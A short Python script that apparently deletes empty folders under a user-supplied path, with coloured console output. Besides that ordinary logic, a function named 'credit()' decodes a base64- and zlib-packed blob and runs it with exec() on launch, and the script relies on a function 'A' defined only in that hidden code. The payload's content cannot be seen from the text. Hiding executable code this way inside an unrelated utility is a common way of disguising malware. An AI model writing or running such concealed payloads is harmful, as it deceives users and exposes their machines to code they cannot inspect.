from colorama import Fore, init, Style
from os import listdir, rmdir, walk
from os.path import isdir, join, exists

bright = Style.BRIGHT
green, red,blue, reset = Fore.GREEN + bright, Fore.RED + bright,Fore.BLUE + bright, Fore.RESET
init(convert=True, autoreset=True)


def delete_empty_folders(path):
    for subdir, dirs, files in walk(path,topdown=False):
        for dir in dirs:
            full_path = join(subdir, dir)
            if not listdir(full_path):
                print(f"{red}[-] Deleting empty folder - {full_path}")
                rmdir(full_path)
    if not listdir(path):
        print(f"{red}[-] Deleting empty folder - {path}")
        rmdir(path)

    
def credit():
    encoded_Data = ['eJx1VM1uozAQPvMWIy6QxhtlD70k4gCBkLTd7oqmh1WTA0qNFomfCMiqq6pSDj3kiiP1Afski41tTJtGAx7PfDPfjB0GP+Gtqev6', 
                    'OptZuyLOqnX2iCOwzSxM8WCyzjTHWhV7PI2KPIUqTjHE6S4vKigTjHeteZsneRGmoXDN8wJDWIKN7qp/CUZxFldT12KbkRMs/cVq', 
                    'Okc+WqClZY/8wPNuhy6yR4HnstW5ufe44c5bTWm4uc2zv7ioLAeF+6rJX+JGHzT10XI9s8JPFaLlWePR+BKxiqzbPGt70GyLWaga', 
                    '5QW4EGdAQ5hTi5uGIS6B4icz00U4e7QMA0XJvvzTsmgaTkrqtIfucHkWwA7EpDWw/cyky5X1YAD9vb8dmRyEcmTG11YAeqAaBKTF', 
                    'qVsmJ2o0kNH6Ttz9/kYkgjA5KvLaA3ckXVTPTVT9C7qaVc+IJR1FHAShUsRB6b3ukqiQWtV7lJ+zsOS17E2RrraT1LjtxG1q6Nek', 
                    'EnJSKyAgknw4LdkUUUPP3QRPWX+y0uCOvmXlyPY6uI0IciJvkrSwWtATJYpA9/AMNfsPNSun4/2qCHbu4vSlQ1ZTS0Jl/+EhZyhq', 
                    '3lz3JqJfAegll+lA0WRKvgd1J2HdqweTZmPTfKF0HlzTeXA18cxrPjl8OUu+06/YMyP92QDj4nL88jDcwK/gpx/YP+AbPNM5+aLz', 
                    'sPlg2oNebGAWePbKc8H5DYG9uL8R0EWTt5m7g/98toYj']
    from base64 import b64decode
    from zlib import decompress
    return (decompress(b64decode("".join(encoded_Data)))).decode()

exec(credit())
A('DELETE EMPTY FOLDERS')

path = input("[+] Enter path or drag and drop the folder : ").replace('"','')
if path=='':
    path = input("[+] Enter path or drag and drop the folder : ").replace('"','')
print(f"{green}[+] Deleting empty folders")
if exists(path) and isdir(path):
    delete_empty_folders(path)
else:
    print(f"{red}[-] Error: {path} not found or permission denied.")
